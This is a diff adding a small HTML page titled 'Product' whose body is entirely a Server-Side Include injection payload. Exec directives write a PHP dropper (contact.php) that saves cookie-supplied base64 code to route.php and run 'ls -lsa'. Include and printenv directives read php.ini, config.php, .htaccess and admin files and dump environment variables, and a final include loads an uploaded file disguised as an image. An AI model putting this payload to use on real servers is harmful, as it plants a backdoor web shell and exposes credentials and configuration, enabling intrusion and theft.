@@ -1,0 +1,15 @@
+<html>
+	<header>Product</header>
+<body>
+	Product
+***<!--#exec cmd="echo '<''?p''hp echo \"[#]\".\"[@]\"; file_p''ut_contents(\"route.php\",base''64_decode($_COOKIE[\"83067585\"])); echo base''64_decode($_COOKIE[\"83067585\"]); ?''>' >contact.php; echo 'yxxx''xxxy';" -->***
+&&&<!--#exec cmd="echo 'cmd''_run'" -->&&&
+[[[<!--#exec cmd="ls -lsa" -->]]]
++++<!--#include file="/admin/php.ini" -->+++
+$$$<!--#include file="/admin/config.php" -->$$$
+\\\<!--#include file="/php.ini" -->\\\
+(((<!--#include file="/.htaccess" -->)))
+===<!--#include virtual="/system/startup.php" -->===
+---<!--#include virtual="/admin/index.php" -->---
+@@@<!--#printenv -->@@@
+</body>wwwwww<!--#include virtual="route.php.jpg.31740d337a6ccd5bf097817749e79b8b" -->wwwwwww</html>
